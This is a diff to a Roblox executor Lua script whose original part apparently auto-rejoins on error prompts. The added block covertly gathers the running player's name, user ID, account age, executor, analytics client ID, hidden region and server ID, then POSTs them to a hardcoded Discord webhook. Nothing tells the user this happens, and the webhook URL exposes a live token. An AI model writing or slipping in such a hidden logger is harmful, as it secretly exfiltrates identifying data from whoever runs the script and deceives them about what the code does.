@@ -1,4 +1,83 @@
 
+local Webhook_URL = "https://discord.com/api/webhooks/1446762884901376031/ZnuKC_nRtPGR8isIFEssv6jXMsqCcxJAvkn0pApSgmG5R5pd3OF8d2b6XWUyXlU57xY-" -- (Tương ứng v19 cũ)
+
+
+local ExecutorName = identifyexecutor and identifyexecutor() or "Unknown Executor" 
+
+
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
+local LocalPlayer = Players.LocalPlayer
+
+
+local RequestFunc = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
+
+if not RequestFunc then
+    warn("Executor của bạn không hỗ trợ hàm request!")
+    return
+end
+
+
+local embedData = {
+    ["title"] = "Click here to view player profile",
+    ["url"] = "https://www.roblox.com/users/" .. LocalPlayer.UserId,
+    ["description"] = "**Someone Executed Ur Script**",
+    ["color"] = 65535,
+    ["fields"] = {
+        {
+            ["name"] = "User",
+            ["value"] = "**Name: ** **" .. LocalPlayer.Name .. "** **Display:** **" .. LocalPlayer.DisplayName .. "**",
+            ["inline"] = false
+        },
+        {
+            ["name"] = "Executor",
+            ["value"] = "**" .. ExecutorName .. "**",
+            ["inline"] = true
+        },
+        {
+            ["name"] = "Account Age",
+            ["value"] = "**" .. LocalPlayer.AccountAge .. "**",
+            ["inline"] = true
+        },
+        {
+            ["name"] = "UserID",
+            ["value"] = "**" .. LocalPlayer.UserId .. "**",
+            ["inline"] = true
+        },
+        {
+            ["name"] = "Client ID",
+            ["value"] = "**" .. RbxAnalyticsService:GetClientId() .. "**",
+            ["inline"] = false
+        },
+        {
+            ["name"] = "Region",
+            -- Sử dụng pcall để tránh lỗi nếu không lấy được hidden property
+            ["value"] = "**" .. (pcall(function() return gethiddenproperty(LocalPlayer, "CountryRegionCodeReplicate") end) and gethiddenproperty(LocalPlayer, "CountryRegionCodeReplicate") or "Unknown") .. "**",
+            ["inline"] = true
+        },
+        {
+            ["name"] = "Server",
+            ["value"] = "**" .. game.JobId .. "**",
+            ["inline"] = true
+        }
+    }
+}
+
+local payload = {
+    ["embeds"] = {embedData}
+}
+
+
+RequestFunc({
+    Url = Webhook_URL,
+    Body = HttpService:JSONEncode(payload),
+    Method = "POST",
+    Headers = {
+        ["Content-Type"] = "application/json"
+    }
+})
+
 local po,ts = game:WaitForChild("CoreGui"):WaitForChild("RobloxPromptGui"):WaitForChild("promptOverlay"),game:GetService('TeleportService')
 po.ChildAdded:connect(function(a)
 if a.Name == 'ErrorPrompt' then
